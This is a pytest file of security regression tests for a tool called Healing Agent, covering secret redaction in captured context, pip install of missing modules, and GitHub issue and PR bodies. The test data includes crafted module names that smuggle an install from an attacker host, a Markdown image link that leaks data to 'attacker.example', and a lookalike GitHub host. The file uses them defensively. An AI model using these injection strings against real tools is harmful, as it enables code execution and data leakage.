"""
Security hardening regressions — no network, no API key required.

Each test pins one way captured data could escape, or one way untrusted input
could steer what Healing Agent does, that a review found and a fix closed.
"""

import importlib
import time

import pytest

from healing_agent import ai_broker
from healing_agent.agent_tools.tool_install_missing_module import extract_module_info
from healing_agent.attempt_ledger import code_span, fence, render
from healing_agent.redactor import redact, scrub_value

# The package replaces itself with a callable in sys.modules, so submodules
# must be imported by full path rather than as a package attribute.
exception_handler = importlib.import_module("healing_agent.exception_handler")
github_issue = importlib.import_module("healing_agent.github_issue")
pr_delivery = importlib.import_module("healing_agent.pr_delivery")


# --- values inside containers are redacted before they become strings -------

def _call_api(headers, settings):
    return headers, settings


def test_secrets_inside_argument_containers_never_reach_the_context():
    context = exception_handler.capture_context(
        func=_call_api,
        args=({"Authorization": "Bearer abc.def"}, {"db_password": "hunter2"}),
        kwargs={},
        config={},
    )
    arguments = str(context["function_arguments"])
    assert "abc.def" not in arguments
    assert "hunter2" not in arguments
    # The structure around the secret is what makes the repair possible.
    assert "Authorization" in arguments
    assert "db_password" in arguments


def test_secrets_inside_local_containers_are_redacted_in_previews():
    session = {"api_key": "sk-live-xyz", "user": "alice"}  # noqa: F841 - captured
    context = exception_handler.capture_context(config={})
    preview = context["variables"]["locals"]["session"]["value_preview"]
    assert "sk-live-xyz" not in preview
    assert "alice" in preview


def test_redact_secrets_false_still_disables_container_redaction():
    context = exception_handler.capture_context(
        func=_call_api,
        args=({"Authorization": "Bearer abc.def"}, {}),
        kwargs={},
        config={"REDACT_SECRETS": False},
    )
    assert "abc.def" in str(context["function_arguments"])


def test_a_structure_too_deep_to_inspect_fails_closed():
    nested = {"password": "hunter2"}
    for _ in range(40):
        nested = {"level": nested}
    assert "hunter2" not in str(redact(nested))


# --- the URL-credential scrubber is linear -----------------------------------

def test_url_scrubbing_stays_fast_on_a_long_word_run():
    # Quadratic before: 2.3 s at 32k characters, minutes at a megabyte.
    started = time.perf_counter()
    scrub_value("a" * 32000)
    assert time.perf_counter() - started < 0.5


def test_url_credentials_are_still_masked():
    out = scrub_value("postgresql+psycopg://app:s3cret@db.internal:5432/sales")
    assert "s3cret" not in out
    assert "db.internal:5432/sales" in out


# --- pip install only ever receives a bare distribution name -----------------

@pytest.mark.parametrize(
    "message",
    [
        "No module named 'x @ https://attacker.example/pkg.whl'",
        "No module named '--index-url=https://attacker.example/simple'",
        "No module named '../../evil'",
        "No module named 'pkg>=0'",
    ],
)
def test_a_crafted_module_name_is_never_installed(message):
    assert extract_module_info(message) is None


def test_a_submodule_installs_its_top_level_distribution():
    assert extract_module_info("No module named 'requests_toolbelt.adapters'") == (
        "requests_toolbelt.adapters",
        "requests_toolbelt",
    )
    assert extract_module_info("No module named 'PIL.Image'") == ("PIL.Image", "pillow")


# --- issue and PR bodies cannot be turned into live Markdown -----------------

INJECTED = "fine\n```\n![x](https://attacker.example/?d=leak) @everyone\n```"


def test_fence_cannot_be_closed_from_inside():
    lines = fence(INJECTED, "text")
    opener, closer = lines[0], lines[-1]
    assert opener.startswith("````") and closer == "````"
    assert "````" not in lines[1]


def test_code_span_stays_on_one_line_and_closed():
    span = code_span("KeyError: `x`\nsecond line")
    assert "\n" not in span
    assert span == "``KeyError: `x` second line``"
    # Content touching the delimiter needs a space, or it merges into it.
    assert code_span("`x`") == "`` `x` ``"


def _context(hint=INJECTED, message=INJECTED):
    return {
        "timestamp": "2026-10-26T10:00:00",
        "error": {
            "type": "ValueError",
            "message": message,
            "file": "/repo/src/loader.py",
            "line_number": 3,
            "error_line": "raise ValueError(payload)",
            "function_name": "load",
        },
        "function_info": {"name": "load", "qualname": "load"},
        "ai_hint": hint,
        "attempts": [
            {"attempt": 1, "outcome": "gate_rejected", "summary": "rejected",
             "detail": INJECTED, "candidate": "def load():\n    '''```'''\n"},
        ],
    }


def _assert_inert(body):
    # Every occurrence of the image link must sit inside a fence opened with
    # more backticks than the injected three.
    in_fence = None
    for line in body.splitlines():
        if in_fence is None and line.startswith("````"):
            in_fence = line.rstrip("abcdefghijklmnopqrstuvwxyz")
        elif in_fence is not None and line == in_fence:
            in_fence = None
        elif "attacker.example" in line:
            assert in_fence is not None or line.lstrip().startswith(("- **Error:** ``", "`")), line


def test_issue_body_keeps_untrusted_text_inert():
    body = github_issue.build_issue(
        _context(), {"GITHUB": {"repo": "o/n", "issue_detail": "reference"}}
    )["body"]
    _assert_inert(body)


def test_pr_body_keeps_untrusted_text_inert():
    _assert_inert(pr_delivery.build_pr_body(_context(), {}))


def test_ledger_detail_is_fenced_not_quoted():
    lines = render(_context()["attempts"])
    assert not any(line.startswith(">") for line in lines)


# --- issues go only to the repository the code lives in ----------------------

@pytest.mark.parametrize(
    "remote, expected",
    [
        ("https://github.com/owner/name.git", "owner/name"),
        ("git@github.com:owner/name.git", "owner/name"),
        ("ssh://git@github.com/owner/name.git", "owner/name"),
        ("https://x-access-token:t@github.com/owner/name", "owner/name"),
        ("https://git.corp.example/mirrors/github.com/psf/requests.git", None),
        ("https://github.com.attacker.example/owner/name", None),
        ("https://github.com/owner/..", None),
    ],
)
def test_detect_repo_is_anchored_to_github(monkeypatch, remote, expected):
    monkeypatch.setattr(github_issue, "_run", lambda *_a, **_k: remote)
    assert github_issue.detect_repo(__file__) == expected


# --- a configured Anthropic gateway is honoured ------------------------------

def test_anthropic_base_url_reaches_the_client(monkeypatch):
    anthropic = pytest.importorskip("anthropic")
    seen = {}

    class _Client:
        def __init__(self, **kwargs):
            seen.update(kwargs)

            class _Messages:
                def create(self, **_kwargs):
                    class _Block:
                        text = "fixed"

                    class _Response:
                        content = [_Block()]

                    return _Response()

            self.messages = _Messages()

    monkeypatch.setattr(anthropic, "Anthropic", _Client)
    ai_broker._get_anthropic_response(
        "prompt",
        {"api_key": "k", "model": "m", "base_url": "https://eu-gateway.example"},
        "system",
    )
    assert seen["base_url"] == "https://eu-gateway.example"
